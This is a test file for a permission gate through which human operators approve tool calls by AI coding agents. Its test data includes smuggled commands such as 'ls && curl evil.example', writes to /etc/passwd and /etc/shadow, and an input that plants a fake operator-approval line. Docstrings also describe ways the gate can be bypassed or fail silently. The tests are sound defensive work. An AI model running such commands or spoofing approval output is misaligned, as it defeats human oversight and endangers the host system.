"""Tests for the permission-approval config."""

from __future__ import annotations

from pathlib import Path

import pytest

from claude_on_the_fly import permissions, settings

# --- defaults ---


def test_off_by_default():
    """Nothing about this feature may turn itself on: the whole compensating
    design (jail, egress proxy, credential broker) assumes today's behaviour is
    what an unconfigured deployment gets."""
    assert permissions.Permissions().mode == "off"
    assert not permissions.Permissions().enabled


def test_bundled_template_ships_the_section_switched_off(operator_settings):
    assert settings.bundled("permissions")
    assert not permissions.configured().enabled


def test_the_bundled_default_claude_mode_is_not_auto():
    """auto hands the decision to a model. Measured on sonnet 5 it approved sudo,
    a write into /etc, chmod -R 777, find -delete and ls ~/.ssh without asking
    once, so it must not be what an operator gets by accident."""
    assert settings.bundled("permissions").get("claude_mode") != "auto"


# --- mode ---


def test_a_bare_off_is_accepted_despite_yaml_reading_it_as_false():
    """YAML 1.1 turns an unquoted `off` into the boolean false. Refusing that
    would be pedantry about quoting in a file operators hand-edit."""
    assert permissions.parse({"mode": False}).mode == "off"


def test_on_is_refused_rather_than_guessed_at():
    """`on` is not one of the two names, and picking one for the operator is how a
    security feature ends up in a state nobody chose."""
    with pytest.raises(permissions.ConfigError, match="not a mode"):
        permissions.parse({"mode": True})


@pytest.mark.parametrize("value", ["asked", "ON", 3, None])
def test_an_unrecognised_mode_is_refused(value):
    with pytest.raises(permissions.ConfigError):
        permissions.parse({"mode": value})


def test_ask_is_case_and_whitespace_tolerant():
    assert permissions.parse({"mode": " ASK "}).mode == "ask"
    assert permissions.parse({"mode": "ask"}).enabled


# --- claude_mode ---


@pytest.mark.parametrize("mode", permissions.CLAUDE_MODES)
def test_every_advertised_claude_mode_parses(mode):
    assert permissions.parse({"claude_mode": mode}).claude_mode == mode


@pytest.mark.parametrize("mode", permissions.SILENT_CLAUDE_MODES)
def test_the_silent_modes_are_refused_and_say_why(mode):
    """Both were measured at zero prompts. Pairing either with `ask` gives a
    deployment that reports approvals as on and gates nothing, which is worse
    than refusing to start."""
    with pytest.raises(permissions.ConfigError, match="never prompts"):
        permissions.parse({"claude_mode": mode})


def test_plan_mode_is_not_accepted():
    """Its interaction with a gate has never been measured, so it is not offered."""
    with pytest.raises(permissions.ConfigError, match="not recognised"):
        permissions.parse({"claude_mode": "plan"})


def test_a_non_string_claude_mode_is_refused():
    with pytest.raises(permissions.ConfigError, match="must be one of"):
        permissions.parse({"claude_mode": 1})


# --- durations ---


def test_durations_default_when_absent():
    resolved = permissions.parse({})
    assert resolved.ttl_seconds == permissions.DEFAULT_TTL_SECONDS
    assert resolved.timeout_seconds == permissions.DEFAULT_TIMEOUT_SECONDS


@pytest.mark.parametrize("key", ["ttl_seconds", "timeout_seconds"])
@pytest.mark.parametrize("value", [0, -5, "soon", True])
def test_a_nonsensical_duration_is_refused(key, value):
    """True is refused explicitly: bool is an int subclass, so without the check a
    `timeout_seconds: yes` would resolve to a one-second answer window."""
    with pytest.raises(permissions.ConfigError):
        permissions.parse({key: value})


def test_durations_accept_ints_and_floats():
    resolved = permissions.parse({"ttl_seconds": 60, "timeout_seconds": 12.5})
    assert (resolved.ttl_seconds, resolved.timeout_seconds) == (60.0, 12.5)


# --- operator overrides ---


def test_the_operator_file_overrides_the_bundled_defaults(operator_settings):
    operator_settings.write_text(
        "permissions:\n  mode: ask\n  claude_mode: manual\n  timeout_seconds: 45\n"
    )
    resolved = permissions.configured()
    assert resolved.enabled
    assert resolved.claude_mode == "manual"
    assert resolved.timeout_seconds == 45.0


def test_a_broken_block_falls_back_to_off_and_says_so(operator_settings, caplog):
    """Failing closed here would gate every tool call in a deployment that never
    asked for it, so a typo has to mean "behave as before"."""
    operator_settings.write_text("permissions:\n  mode: ask\n  claude_mode: nonsense\n")
    with caplog.at_level("ERROR", logger="claude_on_the_fly.permissions"):
        assert not permissions.configured().enabled
    assert "are OFF and tool calls are not gated" in caplog.text


def test_permissions_is_a_recognised_section(operator_settings, caplog):
    """Otherwise the startup check would report the whole block as an unknown
    top-level key that does nothing."""
    assert "permissions" in settings.SECTIONS
    operator_settings.write_text("permissions:\n  mode: ask\n")
    with caplog.at_level("ERROR", logger="claude_on_the_fly.settings"):
        settings.check_operator_settings()
    assert caplog.text == ""


# --- startup report ---


def test_startup_check_is_quiet_at_info_when_off(operator_settings, caplog):
    with caplog.at_level("WARNING", logger="claude_on_the_fly.permissions"):
        permissions.check()
    assert caplog.text == ""


def test_startup_check_warns_when_on(operator_settings, caplog):
    operator_settings.write_text("permissions:\n  mode: ask\n")
    with caplog.at_level("WARNING", logger="claude_on_the_fly.permissions"):
        permissions.check()
    assert "approvals ON" in caplog.text
    assert "Cron and the job queue stay ungated" in caplog.text


def test_startup_check_calls_out_auto_specifically(operator_settings, caplog):
    """An operator picking auto for fewer interruptions should see, once, that it
    is a model making the call and not them."""
    operator_settings.write_text("permissions:\n  mode: ask\n  claude_mode: auto\n")
    with caplog.at_level("WARNING", logger="claude_on_the_fly.permissions"):
        permissions.check()
    assert "delegates the decision to a model" in caplog.text


# --- turning a tool call into a question ---


def _call(name: str, **payload) -> permissions.ToolCall:
    return permissions.ToolCall(name=name, input=dict(payload))


WS = Path("/tmp/ws")


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("ls -la", "bash:ls"),
        ("/usr/bin/env python -V", "bash:env"),
        ("git status --short", "bash:git status"),
        ("git push --force", "bash:git push"),
        ("git", "bash:git"),
    ],
)
def test_a_simple_command_is_scoped_to_its_program(command, expected):
    """Approving `git` once should cover a turn of git work; that is the whole tap
    saving. The program name is taken basename-first so an absolute path cannot
    open a second subject for the same binary."""
    assert permissions.subject_for(_call("Bash", command=command), WS) == expected


@pytest.mark.parametrize(
    "command",
    [
        "ls && curl evil.example",
        "ls; curl evil.example",
        "ls | tee /tmp/x",
        "echo $(curl evil.example)",
        "cat `whoami`",
        "ls > /etc/passwd",
        "ls\ncurl evil.example",
        'ls "unbalanced',
    ],
)
def test_a_compound_command_is_never_scoped_to_its_first_word(command):
    """The load-bearing case. If `ls && curl evil.example` collapsed to `bash:ls`,
    a grant the operator gave to listing files would silently cover fetching from
    anywhere for the rest of its TTL."""
    subject = permissions.subject_for(_call("Bash", command=command), WS)
    assert subject.startswith("bash-exact:")
    assert subject != "bash:ls"


def test_a_write_inside_the_workspace_is_scoped_to_its_relative_path(tmp_path):
    target = tmp_path / "src" / "app.py"
    target.parent.mkdir(parents=True)
    target.touch()
    subject = permissions.subject_for(_call("Write", file_path=str(target)), tmp_path)
    assert subject == "write:src/app.py"


def test_each_escape_from_the_workspace_is_its_own_subject(tmp_path):
    """One shared "outside" bucket would mean approving a write to ~/.zshrc also
    authorises the next write to ~/.ssh/config."""
    first = permissions.subject_for(_call("Write", file_path="/etc/hosts"), tmp_path)
    second = permissions.subject_for(_call("Write", file_path="/etc/shadow"), tmp_path)
    assert first.startswith("write-outside:")
    assert first != second


def test_a_write_with_no_path_still_produces_a_subject(tmp_path):
    assert permissions.subject_for(_call("Write"), tmp_path) == "write:<no path>"


def test_a_patch_is_scoped_to_its_own_body(tmp_path):
    """codex sends the whole patch in `command`, so there is no single path to key
    on and no safe way to widen it."""
    subject = permissions.subject_for(
        _call("apply_patch", command="*** Begin Patch\n*** Update File: a.txt\n"),
        tmp_path,
    )
    assert subject.startswith("patch-exact:")
    assert "\n" not in subject


@pytest.mark.parametrize(
    ("url", "expected"),
    [
        ("https://api.github.com/repos", "fetch:api.github.com"),
        ("not a url", "fetch:<no host>"),
    ],
)
def test_a_fetch_is_scoped_to_its_host(url, expected):
    assert permissions.subject_for(_call("WebFetch", url=url), WS) == expected


def test_an_unrecognised_tool_gets_one_subject_per_tool():
    assert permissions.subject_for(_call("SomeNewTool", x=1), WS) == "tool:SomeNewTool"


# --- the operator-facing detail ---


def test_detail_names_who_raised_the_question():
    """claude asking and cotf deciding to ask mean different things about how much
    thought went into the question, so the operator sees which."""
    call = _call("Bash", command="rm -f x")
    assert permissions.detail_for(call, asked_by="claude").startswith("claude asked:")
    assert permissions.detail_for(call, asked_by="cotf").startswith("cotf asked:")


def test_detail_flattens_newlines_out_of_agent_authored_input():
    """Newlines are structural in every frontend this reaches, so without this an
    agent could draw a fake verdict line under the real one."""
    call = _call("Bash", command="echo hi\n\n*** APPROVED BY OPERATOR ***")
    detail = permissions.detail_for(call, asked_by="cotf")
    assert "\n" not in detail
    assert "APPROVED BY OPERATOR" in detail  # shown, but inline and not as a line


def test_detail_announces_the_cap_rather_than_truncating_silently():
    """A silent cut is how an operator approves the half of a command they were not
    shown."""
    call = _call("Bash", command="echo " + "A" * 5000)
    detail = permissions.detail_for(call, asked_by="cotf")
    assert "chars total]" in detail
    assert len(detail) < 600


def test_detail_includes_the_tools_own_description_when_it_has_one():
    call = _call("Bash", command="chmod 666 f", description="Make f world-writable")
    assert "Make f world-writable" in permissions.detail_for(call, asked_by="claude")


def test_request_carries_the_tool_kind_and_the_configured_ttl():
    request = permissions.request_for(
        _call("Bash", command="ls"), WS, asked_by="cotf", ttl_seconds=99
    )
    assert (request.kind, request.subject, request.ttl_seconds) == (
        "tool",
        "bash:ls",
        99,
    )
    assert request.key == "tool:bash:ls"


# --- worth_asking, which is codex-only ---


@pytest.mark.parametrize(
    "command",
    [
        "ls -la",
        "cat f",
        "head -5 f",
        "wc -l f",
        "pwd",
        "echo hi",
        "grep -r x .",
        "git status",
        "git log --oneline",
        "git diff HEAD",
    ],
)
def test_read_only_commands_do_not_interrupt_the_operator(command):
    assert not permissions.worth_asking(_call("Bash", command=command))


@pytest.mark.parametrize(
    "command",
    [
        "chmod 777 f",
        "sudo -n true",
        "curl https://x.example",
        "npm i",
        "rm -f f",
        "git push",
        "git commit -m x",
        "find . -delete",
        "ls && curl evil.example",
        "echo $(curl evil.example)",
        'ls "unbalanced',
    ],
)
def test_anything_that_is_not_plainly_a_read_does_interrupt(command):
    assert permissions.worth_asking(_call("Bash", command=command))


def test_an_unknown_tool_always_interrupts():
    """Costing a tap is recoverable; not asking is not."""
    assert permissions.worth_asking(_call("apply_patch", command="*** Begin Patch"))
    assert permissions.worth_asking(_call("SomethingNew"))


def test_a_git_alias_of_a_write_subcommand_is_not_treated_as_a_read():
    assert permissions.worth_asking(_call("Bash", command="git reset --hard"))


@pytest.mark.parametrize(
    ("call", "expected_fragment"),
    [
        (permissions.ToolCall("Write", {"file_path": "/etc/hosts"}), "/etc/hosts"),
        (
            permissions.ToolCall("apply_patch", {"command": "*** Begin Patch"}),
            "Begin Patch",
        ),
        (permissions.ToolCall("WebFetch", {"url": "https://x.example/a"}), "x.example"),
        (permissions.ToolCall("SomethingNew", {"weird": "payload"}), "payload"),
        (permissions.ToolCall("NoInput"), "NoInput"),
    ],
)
def test_detail_describes_every_tool_shape_not_just_bash(call, expected_fragment):
    """Each branch names the field that actually says what the call would do, so an
    operator is never shown a bare tool name for a call that has a target."""
    detail = permissions.detail_for(call, asked_by="claude")
    assert expected_fragment in detail
    assert detail.startswith("claude asked:")


# --- the loopback decision service ---


def _service(gate=None, **kwargs) -> permissions.PermissionService:
    from claude_on_the_fly.approvals import ApprovalBroker, RecordingGate, tool_policy

    return permissions.PermissionService(
        broker=ApprovalBroker(
            gate if gate is not None else RecordingGate(default=True),
            policies={"tool": tool_policy()},
        ),
        workspace=Path("/tmp/ws"),
        **kwargs,
    )


async def test_a_cotf_sourced_read_is_allowed_without_asking_anyone():
    """codex has no filter of its own, so without this a turn of `ls` and
    `git status` would cost the operator a tap each."""
    from claude_on_the_fly.approvals import RecordingGate

    gate = RecordingGate(default=True)
    allowed, message = await _service(gate).decide(
        _call("Bash", command="git status"), permissions.SOURCE_COTF
    )
    assert allowed
    assert gate.seen == []
    assert "below the ask threshold" in message


async def test_the_same_read_from_claude_is_forwarded_not_filtered():
    """claude only calls out for what it would have prompted about, so filtering
    its questions again would drop questions it had already decided to ask."""
    from claude_on_the_fly.approvals import RecordingGate

    gate = RecordingGate(default=True)
    allowed, _ = await _service(gate).decide(
        _call("Bash", command="git status"), permissions.SOURCE_CLAUDE
    )
    assert allowed
    assert [request.subject for request in gate.seen] == ["bash:git status"]


async def test_a_denial_tells_the_agent_what_to_do_next():
    """Not "denied by policy": the agent cannot distinguish a refusal from a
    timeout or a rate limit, and naming one would put words in the operator's
    mouth."""
    from claude_on_the_fly.approvals import RecordingGate

    allowed, message = await _service(RecordingGate(default=False)).decide(
        _call("Bash", command="curl https://x.example"), permissions.SOURCE_COTF
    )
    assert not allowed
    assert "did not approve" in message
    assert "Do not retry" in message


async def test_the_configured_ttl_reaches_the_grant():
    from claude_on_the_fly.approvals import RecordingGate

    gate = RecordingGate(default=True)
    await _service(gate, ttl_seconds=42).decide(
        _call("Bash", command="chmod 700 f"), permissions.SOURCE_COTF
    )
    assert gate.seen[0].ttl_seconds == 42


async def test_the_service_answers_over_loopback():
    """Live: a real socket, because the shim reaches this over HTTP and a unit test
    against `decide` alone would not exercise the request parsing."""
    import aiohttp

    service = _service()
    await service.start()
    try:
        assert service.base_url.startswith("http://127.0.0.1:")
        async with (
            aiohttp.ClientSession() as session,
            session.post(
                service.base_url + permissions.DECIDE_PATH,
                json={
                    "source": "claude",
                    "tool_name": "Bash",
                    "input": {"command": "ls"},
                    "tool_use_id": "toolu_1",
                },
            ) as response,
        ):
            assert (await response.json())["behavior"] == "allow"
    finally:
        await service.stop()


async def test_port_and_base_url_refuse_before_start():
    service = _service()
    with pytest.raises(RuntimeError, match="not started"):
        _ = service.port


@pytest.mark.parametrize(
    ("body", "expected_status"),
    [("not json", 400), ('["a list"]', 400)],
)
async def test_a_malformed_request_is_rejected_not_allowed(body, expected_status):
    import aiohttp

    service = _service()
    await service.start()
    try:
        async with (
            aiohttp.ClientSession() as session,
            session.post(
                service.base_url + permissions.DECIDE_PATH,
                data=body,
                headers={"Content-Type": "application/json"},
            ) as response,
        ):
            assert response.status == expected_status
    finally:
        await service.stop()


async def test_a_request_with_no_tool_name_is_denied():
    """Fail closed: an unnamed call cannot be classified, so allowing it would make
    a malformed request the way around the gate."""
    import aiohttp

    service = _service()
    await service.start()
    try:
        async with (
            aiohttp.ClientSession() as session,
            session.post(
                service.base_url + permissions.DECIDE_PATH, json={"input": {}}
            ) as response,
        ):
            assert (await response.json())["behavior"] == "deny"
    finally:
        await service.stop()


async def test_a_missing_source_is_treated_as_cotf_not_as_claude():
    """The two differ in whether cotf filters. Defaulting to claude would forward
    everything and defeat the filter; defaulting to cotf only risks a quiet allow
    for reads, which is the recoverable direction."""
    import aiohttp

    from claude_on_the_fly.approvals import RecordingGate

    gate = RecordingGate(default=True)
    service = _service(gate)
    await service.start()
    try:
        async with (
            aiohttp.ClientSession() as session,
            session.post(
                service.base_url + permissions.DECIDE_PATH,
                json={"tool_name": "Bash", "input": {"command": "ls"}},
            ) as response,
        ):
            assert (await response.json())["behavior"] == "allow"
        assert gate.seen == []
    finally:
        await service.stop()


async def test_stop_is_safe_before_start():
    await _service().stop()


# --- wiring a backend up ---


def test_claude_argv_is_the_old_pair_when_off():
    """The off path has to be byte-identical to the behaviour before this feature,
    or enabling nothing still changes how every session is spawned."""
    assert permissions.claude_argv(permissions.Permissions()) == [
        "--permission-mode",
        "bypassPermissions",
    ]


def test_codex_argv_is_empty_when_off():
    assert permissions.codex_argv(permissions.Permissions()) == []


def test_claude_argv_sets_the_mode_and_the_prompt_tool_together():
    """Only correct as a pair: under bypassPermissions claude asks nothing and the
    prompt tool is never called, which is why claude_mode refuses that value."""
    argv = permissions.claude_argv(
        permissions.Permissions(mode="ask", claude_mode="manual")
    )
    assert argv[:2] == ["--permission-mode", "manual"]
    assert "--permission-prompt-tool" in argv
    assert permissions.PROMPT_TOOL in argv
    assert str(permissions.mcp_config_path()) in argv


def test_the_prompt_tool_name_matches_the_mcp_server_it_advertises():
    """claude validates this name at startup and refuses to run if it does not
    resolve, so a mismatch here is a daemon that cannot spawn a turn at all."""
    from claude_on_the_fly import cotf_approve

    assert (
        f"mcp__{permissions.MCP_SERVER_NAME}__{cotf_approve.TOOL_NAME}"
    ) == permissions.PROMPT_TOOL


def test_codex_argv_carries_the_hook_and_the_trust_bypass_together():
    """Without the bypass the hook is silently skipped and the command runs anyway,
    which is the exact failure this feature exists to prevent. They must never be
    separable."""
    argv = permissions.codex_argv(permissions.Permissions(mode="ask"))
    assert "--dangerously-bypass-hook-trust" in argv
    hook = argv[argv.index("-c") + 1]
    assert hook.startswith("hooks.PreToolUse=[")
    assert f"{permissions.shim_path()} hook" in hook


def test_the_codex_hook_timeout_follows_the_configured_answer_window():
    """A hook that gives up before the operator's window closes would turn a slow
    approval into a denial codex attributes to nobody."""
    argv = permissions.codex_argv(
        permissions.Permissions(mode="ask", timeout_seconds=123)
    )
    assert "timeout=123" in argv[argv.index("-c") + 1]


def test_the_shim_is_generated_executable_and_reserved(operator_settings):
    """It shares the command broker's shim directory, whose stale sweep removes
    anything it does not recognise, so the reservation is what stops it being
    deleted on the next startup."""
    import os

    from claude_on_the_fly import commands

    path = permissions.write_shim()
    assert path.is_file()
    assert os.access(path, os.X_OK)
    assert "cotf_approve" in path.read_text()
    assert path.name in commands.RESERVED_SHIM_NAMES


def test_the_mcp_config_names_the_shim_and_not_a_port(operator_settings):
    """Baking a port in would point one chat's approvals at another chat's grant
    store, since the config file is shared and the port is per session."""
    import json

    path = permissions.write_mcp_config()
    config = json.loads(path.read_text())
    server = config["mcpServers"][permissions.MCP_SERVER_NAME]
    assert server["command"] == str(permissions.shim_path())
    assert server["args"] == ["mcp"]
    assert "127.0.0.1" not in path.read_text()


# --- the ungated-turn guard ---


def test_a_turn_that_used_tools_without_asking_is_reported(caplog):
    """The substitute for a startup self-test. codex treats an untrusted or crashed
    hook as no opinion and runs the command, so the failure is silent by
    construction: the operator sees a normal turn and believes it was supervised."""
    with caplog.at_level("ERROR", logger="claude_on_the_fly.permissions"):
        assert permissions.warn_if_ungated(3, 0, backend="codex") is True
    assert "ran UNSUPERVISED" in caplog.text
    assert "codex" in caplog.text


@pytest.mark.parametrize(
    ("tool_calls", "requests_seen"),
    [(0, 0), (3, 1), (0, 5)],
)
def test_the_guard_stays_quiet_when_there_is_nothing_wrong(
    tool_calls, requests_seen, caplog
):
    """A turn with no tool calls asks nothing legitimately, and a turn that reached
    the gate at all proves the wiring is attached."""
    with caplog.at_level("ERROR", logger="claude_on_the_fly.permissions"):
        assert (
            permissions.warn_if_ungated(tool_calls, requests_seen, backend="x") is False
        )
    assert caplog.text == ""


async def test_the_service_counts_every_decision_it_is_asked_for():
    """Including the ones it answers itself: a filtered read still proves the gate
    was reached, which is the only thing the guard needs to know."""
    from claude_on_the_fly.approvals import RecordingGate

    service = _service(RecordingGate(default=True))
    assert service.requests_seen == 0
    await service.decide(_call("Bash", command="ls"), permissions.SOURCE_COTF)
    await service.decide(_call("Bash", command="curl x"), permissions.SOURCE_COTF)
    assert service.requests_seen == 2


def test_pty_never_enters_an_asking_mode_it_cannot_honour(caplog):
    """Interactive claude resolves --permission-prompt-tool, connects the server,
    and then never calls it: it draws its own terminal dialog. Nobody is attached to
    that pane, so an asking mode would hang every gated turn instead of gating it.
    Verified by running one to the timeout."""
    resolved = permissions.Permissions(mode="ask", claude_mode="default")
    with caplog.at_level("WARNING", logger="claude_on_the_fly.permissions"):
        argv = permissions.claude_argv(resolved, pty=True)
    assert argv == ["--permission-mode", "bypassPermissions"]
    assert "--permission-prompt-tool" not in argv


def test_an_ungated_pty_session_says_so_rather_than_looking_gated(caplog):
    """The dangerous version of this is silence: an operator who switched approvals
    on would otherwise assume every backend honours them."""
    with caplog.at_level("WARNING", logger="claude_on_the_fly.permissions"):
        permissions.claude_argv(permissions.Permissions(mode="ask"), pty=True)
    assert "runs UNGATED" in caplog.text
    assert "native backend" in caplog.text


def test_pty_with_approvals_off_is_silent(caplog):
    with caplog.at_level("WARNING", logger="claude_on_the_fly.permissions"):
        argv = permissions.claude_argv(permissions.Permissions(), pty=True)
    assert argv == ["--permission-mode", "bypassPermissions"]
    assert caplog.text == ""
